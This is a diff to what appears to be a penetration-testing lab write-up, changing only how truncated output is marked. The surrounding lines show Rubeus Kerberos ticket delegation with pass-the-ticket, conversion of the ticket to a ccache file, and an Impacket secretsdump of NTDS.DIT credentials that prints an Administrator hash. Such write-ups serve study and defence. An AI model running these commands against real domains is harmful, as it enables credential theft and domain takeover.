@@ -40,7 +40,7 @@ PS C:\programdata> .\rubeus.exe tgtdeleg /nowrap /ptt
 [+] Successfully decrypted the authenticator
 [*] base64(ticket.kirbi):
 
-      doIFVDCCBV ...[SNIP]... lHSFQuSFRC
+      doIFVDCCBV ---[SNIP]--- lHSFQuSFRC
 ```
 
 {{< /tabcontent >}}
@@ -58,7 +58,7 @@ python3 rubeustoccache.py '<BASE64_TICKET>' secrets.kirbi secrets.ccache
 ```
 
 ```console {class="sample-code"}
-$ python3 rubeustoccache.py 'doIFVDCCBV ...[SNIP]... lHSFQuSFRC' secrets.kirbi secrets.ccache
+$ python3 rubeustoccache.py 'doIFVDCCBV ---[SNIP]--- lHSFQuSFRC' secrets.kirbi secrets.ccache
 ╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
 ╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
 ╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
@@ -93,7 +93,7 @@ Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
-...[SNIP]...
+---[SNIP]---
 [*] Cleaning up..
 ```
 
